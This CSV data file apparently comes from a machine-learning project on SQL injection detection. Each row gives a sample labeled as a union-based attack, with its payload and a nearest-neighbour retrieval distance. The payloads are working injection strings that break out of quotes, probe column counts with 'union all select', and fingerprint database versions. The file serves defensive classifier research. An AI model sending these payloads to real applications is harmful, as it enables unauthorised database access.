id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000200,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000537,4.542581807651445
CTGAN_000201,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000414,4.762701321832762
CTGAN_000202,attack,union,"-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#",nearest_attack_euclidean,R000147,4.125947014197445
CTGAN_000203,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000469,5.623783554236595
CTGAN_000204,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000426,4.676694265328081
CTGAN_000205,attack,union,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",nearest_attack_euclidean,R000117,4.888792019712182
CTGAN_000206,attack,union,"1""   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000479,5.533196017259622
CTGAN_000207,attack,union,"1'  )   as xhmm where 8092  =  8092 union all select null,null,null--",nearest_attack_euclidean,R000567,5.17098421760272
CTGAN_000208,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000378,5.662107098954617
CTGAN_000209,attack,union,"-2263'  )   where 7931  =  7931 union all select 7931,7931,7931--",nearest_attack_euclidean,R000693,4.342203268085691
CTGAN_000210,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000419,6.069189025490637
CTGAN_000211,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000369,5.005723978534054
CTGAN_000212,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000115,7.5579226534754635
CTGAN_000213,attack,union,"-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--",nearest_attack_euclidean,R000492,5.832389580074639
CTGAN_000214,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000530,5.115528812454309
CTGAN_000215,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000152,3.4777799272485885
CTGAN_000216,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,5.500964054204249
CTGAN_000217,attack,union,"-2263'  )   where 7931  =  7931 union all select 7931,7931,7931--",nearest_attack_euclidean,R000693,5.846055668275227
CTGAN_000218,attack,union,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",nearest_attack_euclidean,R000681,6.076064754629844
CTGAN_000219,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000157,5.568736218206095
CTGAN_000220,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000373,4.4129047709806075
CTGAN_000221,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000613,5.21022677344818
CTGAN_000222,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000115,6.947813599996281
CTGAN_000223,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000234,4.45647221206261
CTGAN_000224,attack,union,"-5744  )   union all select 3617,3617,3617,3617,3617,3617--",nearest_attack_euclidean,R000279,5.727072061303867
CTGAN_000225,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000609,4.38294256031803
CTGAN_000226,attack,union,"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",nearest_attack_euclidean,R000594,3.62588748305863
CTGAN_000227,attack,union,"-4919  )   union all select 2608,2608,2608,2608,2608,2608#",nearest_attack_euclidean,R000405,3.833825869434248
CTGAN_000228,attack,union,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",nearest_attack_euclidean,R000681,4.817810204155578
CTGAN_000229,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R000296,5.859575837608801
CTGAN_000230,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000675,4.665018193890831
CTGAN_000231,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000163,5.82988943216663
CTGAN_000232,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000239,4.708298375039048
CTGAN_000233,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000620,5.16934418412029
CTGAN_000234,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,5.074747843777829
CTGAN_000235,attack,union,"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",nearest_attack_euclidean,R000584,5.1550584100663706
CTGAN_000236,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000408,5.329462939968038
CTGAN_000237,attack,union,"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",nearest_attack_euclidean,R000149,6.6842548395786245
CTGAN_000238,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000609,3.987065363008454
CTGAN_000239,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000664,4.321362062897078
CTGAN_000240,attack,union,"-9039'  )   union all select 8058,8058,8058,8058,8058--",nearest_attack_euclidean,R000165,4.378474997227786
CTGAN_000241,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000773,5.987669861999491
CTGAN_000242,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000124,5.010402973187222
CTGAN_000243,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000239,5.3335771336866875
CTGAN_000244,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000311,2.7124294520542405
CTGAN_000245,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R000718,5.682468524709086
CTGAN_000246,attack,union,"1%'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000595,5.275248609459971
CTGAN_000247,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,4.158705856698011
CTGAN_000248,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,4.89612963894468
CTGAN_000249,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,5.660395554204483
CTGAN_000250,attack,union,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",nearest_attack_euclidean,R000579,6.520940066030464
CTGAN_000251,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000456,3.1899100535227873
CTGAN_000252,attack,union,"-1807'   )    )    union all select 9853,9853,9853,9853,9853,9853#",nearest_attack_euclidean,R000306,5.513769155444318
CTGAN_000253,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000152,5.448802436383684
CTGAN_000254,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000435,3.236131120055386
CTGAN_000255,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000378,5.702266241278454
CTGAN_000256,attack,union,"-6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024#",nearest_attack_euclidean,R000285,4.530266267028084
CTGAN_000257,attack,union,"1   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000244,4.279282532070547
CTGAN_000258,attack,union,"-6158""  )   union all select 3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000125,5.162149069968737
CTGAN_000259,attack,union,"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",nearest_attack_euclidean,R000158,4.486736251382223
CTGAN_000260,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000765,6.255142346219192
CTGAN_000261,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,4.524837917682254
CTGAN_000262,attack,union,"-9574%'   )    )    union all select 5645,5645,5645,5645,5645,5645,5645--",nearest_attack_euclidean,R000344,5.784726400324737
CTGAN_000263,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000243,4.726609279392436
CTGAN_000264,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000230,4.048620567194216
CTGAN_000265,attack,union,"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R000374,5.312696202558634
CTGAN_000266,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000373,5.400765792556616
CTGAN_000267,attack,union,"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",nearest_attack_euclidean,R000559,6.744191277540277
CTGAN_000268,attack,union,"-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#",nearest_attack_euclidean,R000147,5.128577195670867
CTGAN_000269,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000146,6.245308877440367
CTGAN_000270,attack,union,"1   )    )    as mgvw where 4923  =  4923 union all select null,null,null,null--",nearest_attack_euclidean,R000351,4.908105885655656
CTGAN_000271,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000537,6.708498057884704
CTGAN_000272,attack,union,"-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#",nearest_attack_euclidean,R000147,6.932042647664411
CTGAN_000273,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000609,4.548087364507331
CTGAN_000274,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000397,4.431568551779788
CTGAN_000275,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000685,3.8160308396130467
CTGAN_000276,attack,union,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",nearest_attack_euclidean,R000316,6.531655833185152
CTGAN_000277,attack,union,"1 where 6412  =  6412 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000422,4.147426840848061
CTGAN_000278,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000738,4.888733596580268
CTGAN_000279,attack,union,"1' where 8969  =  8969 union all select null,null,null,null,null--",nearest_attack_euclidean,R000602,4.18564661683285
CTGAN_000280,attack,union,"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",nearest_attack_euclidean,R000665,3.8750729355010285
CTGAN_000281,attack,union,"1 where 6412  =  6412 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000422,4.205806548573658
CTGAN_000282,attack,union,"-8771""   )    )    union all select 6302,6302,6302,6302,6302#",nearest_attack_euclidean,R000326,4.312710761396262
CTGAN_000283,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000675,7.264873876089009
CTGAN_000284,attack,union,"1%'  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000553,4.419769618738288
CTGAN_000285,attack,union,"1 where 6412  =  6412 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000422,5.62326804833356
CTGAN_000286,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000182,5.000336474727699
CTGAN_000287,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000720,3.669601624381271
CTGAN_000288,attack,union,"-6200' where 9150  =  9150 union all select 9150,9150,9150,9150,9150,9150,9150#",nearest_attack_euclidean,R000341,4.676032115930474
CTGAN_000289,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000238,5.721246737737862
CTGAN_000290,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000163,4.11229500610732
CTGAN_000291,attack,union,"-4152""  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781--",nearest_attack_euclidean,R000263,2.4272229416902236
CTGAN_000292,attack,union,"-9039'  )   union all select 8058,8058,8058,8058,8058--",nearest_attack_euclidean,R000165,2.9938805686580547
CTGAN_000293,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000675,4.771728065484134
CTGAN_000294,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000664,4.362645545714182
CTGAN_000295,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000182,5.038493371113598
CTGAN_000296,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,5.399493876860932
CTGAN_000297,attack,union,"1%'   )    )     )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000660,5.535183671045548
CTGAN_000298,attack,union,"1%'   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000114,6.062910230852234
CTGAN_000299,attack,union,"-3441'   )    )    as dxvt where 9291  =  9291 union all select 9291,9291,9291#",nearest_attack_euclidean,R000357,4.292977855993012
CTGAN_000300,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000609,4.730561385706754
CTGAN_000301,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000741,4.608745019558725
CTGAN_000302,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000239,3.7629064513454527
CTGAN_000303,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000237,6.123857217458337
CTGAN_000304,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000157,4.814769016092569
CTGAN_000305,attack,union,"-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--",nearest_attack_euclidean,R000492,3.8986348046373007
CTGAN_000306,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000156,4.968927499996431
CTGAN_000307,attack,union,"1%'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000377,4.986180651157604
CTGAN_000308,attack,union,"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",nearest_attack_euclidean,R000594,4.722751288806633
CTGAN_000309,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000720,5.703691047183864
CTGAN_000310,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000639,5.3730127718205685
CTGAN_000311,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000675,5.780887659662991
CTGAN_000312,attack,union,"1' where 3760  =  3760 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000552,4.422798192612933
CTGAN_000313,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000163,5.3051115933771085
CTGAN_000314,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000435,5.012110584244934
CTGAN_000315,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000469,6.175544304684841
CTGAN_000316,attack,union,"-2783' where 1494  =  1494 union all select 1494,1494,1494,1494,1494,1494--",nearest_attack_euclidean,R000360,4.938960495947686
CTGAN_000317,attack,union,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000527,5.539383551800811
CTGAN_000318,attack,union,"-6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024#",nearest_attack_euclidean,R000285,3.5402380344768956
CTGAN_000319,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000115,3.4709256685271814
CTGAN_000320,attack,union,"1' where 4358  =  4358 union all select null,null,null,null--",nearest_attack_euclidean,R000614,5.4188190867177175
CTGAN_000321,attack,union," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",nearest_attack_euclidean,R000030,6.076555155494951
CTGAN_000322,attack,union,"1   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000244,4.105051511692788
CTGAN_000323,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R000678,6.047182907949901
CTGAN_000324,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000486,6.992293985668989
CTGAN_000325,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000687,5.929824282175268
CTGAN_000326,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,5.940387945807926
CTGAN_000327,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000417,6.003708281615594
CTGAN_000328,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000685,4.618622214717187
CTGAN_000329,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,4.661917613974396
CTGAN_000330,attack,union,"-8981%""   )    )     )   union all select 4538,4538,4538,4538,4538,4538,4538#",nearest_attack_euclidean,R000658,5.950026110446076
CTGAN_000331,attack,union,"1%'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000634,3.9471581272899527
CTGAN_000332,attack,union,"1""  )   as jiyl where 4893  =  4893 union all select null,null,null,null,null#",nearest_attack_euclidean,R000516,6.12727538305374
CTGAN_000333,attack,union,"1""  )   where 2633  =  2633 union all select null,null,null,null#",nearest_attack_euclidean,R000297,5.0701890993813015
CTGAN_000334,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000656,5.748369646926481
CTGAN_000335,attack,union,"1"" union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000778,5.894221654049361
CTGAN_000336,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000720,6.6561254707271305
CTGAN_000337,attack,union,"-9837"" where 7201  =  7201 union all select 7201,7201,7201--",nearest_attack_euclidean,R000509,5.442860151218656
CTGAN_000338,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000664,4.335482023618031
CTGAN_000339,attack,union,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000527,5.048476072837311
CTGAN_000340,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000399,4.529076131363533
CTGAN_000341,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,4.639765842073929
CTGAN_000342,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000115,5.2213973706517445
CTGAN_000343,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000675,5.893732840244635
CTGAN_000344,attack,union,"1  )   as lejp where 5238  =  5238 union all select null,null,null,null,null#",nearest_attack_euclidean,R000711,4.209008548907365
CTGAN_000345,attack,union,"1%'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000377,4.363024251699671
CTGAN_000346,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,4.786974965225132
CTGAN_000347,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000239,5.528402274428744
CTGAN_000348,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000419,5.465804362910839
CTGAN_000349,attack,union,"1'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000229,4.667665103211133
CTGAN_000350,attack,union,"1' where 7445  =  7445 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000719,5.498928109061522
CTGAN_000351,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000239,2.5708972260214837
CTGAN_000352,attack,union,"-8699""  )   union all select 8645,8645,8645,8645,8645,8645--",nearest_attack_euclidean,R000651,5.174100598933569
CTGAN_000353,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000687,5.105912097677438
CTGAN_000354,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000239,4.492215774312217
CTGAN_000355,attack,union,"-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--",nearest_attack_euclidean,R000492,5.996937677476206
CTGAN_000356,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000537,5.710249685971402
CTGAN_000357,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R000296,5.472447056255019
CTGAN_000358,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000231,4.281583551161789
CTGAN_000359,attack,union,"1' where 3760  =  3760 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000552,6.643734636329307
CTGAN_000360,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000381,5.71981963638921
CTGAN_000361,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000741,4.335602774910059
CTGAN_000362,attack,union,"1  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000703,3.6330035607216926
CTGAN_000363,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000157,7.317173247634902
CTGAN_000364,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,5.7508835313444315
CTGAN_000365,attack,union,"-1339   )    )     )   union all select 2938,2938,2938,2938,2938,2938#",nearest_attack_euclidean,R000134,5.115102084034236
CTGAN_000366,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000115,4.993733007835677
CTGAN_000367,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000446,4.5970541960589895
CTGAN_000368,attack,union,"-2783' where 1494  =  1494 union all select 1494,1494,1494,1494,1494,1494--",nearest_attack_euclidean,R000360,5.704530258928233
CTGAN_000369,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000615,4.468579609998863
CTGAN_000370,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000664,5.145791953784628
CTGAN_000371,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R000718,4.513329501954631
CTGAN_000372,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,4.118925175102209
CTGAN_000373,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000379,5.482622065311179
CTGAN_000374,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000379,4.910628125990583
CTGAN_000375,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,5.306495668823936
CTGAN_000376,attack,union,"-3725'   )    )    union all select 1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000284,4.677084359689744
CTGAN_000377,attack,union,"-8773%'   )    )     )   union all select 8941,8941,8941,8941,8941,8941#",nearest_attack_euclidean,R000541,4.593081804143369
CTGAN_000378,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000675,3.909204431084924
CTGAN_000379,attack,union,"-1807'   )    )    union all select 9853,9853,9853,9853,9853,9853#",nearest_attack_euclidean,R000306,4.7263430833923055
CTGAN_000380,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000561,6.007163167740276
CTGAN_000381,attack,union,"1'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000301,5.519011402507567
CTGAN_000382,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000685,6.09511104484958
CTGAN_000383,attack,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000040,6.05568824043878
CTGAN_000384,attack,union,"-9661""   )    )     )   union all select 2158,2158,2158--",nearest_attack_euclidean,R000274,5.356979828909835
CTGAN_000385,attack,union,"1'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000548,4.041750991753748
CTGAN_000386,attack,union,"1   )    )    as mgvw where 4923  =  4923 union all select null,null,null,null--",nearest_attack_euclidean,R000351,5.875837150018389
CTGAN_000387,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000330,5.22373114050884
CTGAN_000388,attack,union,"-1244  )   as qszw where 2332  =  2332 union all select 2332,2332,2332,2332#",nearest_attack_euclidean,R000161,5.183409075117347
CTGAN_000389,attack,union,"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R000374,6.706959489260805
CTGAN_000390,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000609,4.506389590559207
CTGAN_000391,attack,union,"-3126   )    )    union all select 6718,6718,6718,6718,6718--",nearest_attack_euclidean,R000404,4.287227137475255
CTGAN_000392,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000399,4.172651828269299
CTGAN_000393,attack,union,"1'  )   as xhmm where 8092  =  8092 union all select null,null,null--",nearest_attack_euclidean,R000567,3.2333395194487258
CTGAN_000394,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000106,4.81144809536238
CTGAN_000395,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000115,5.256454094117564
CTGAN_000396,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000177,5.324540801959101
CTGAN_000397,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000016,7.215157227086727
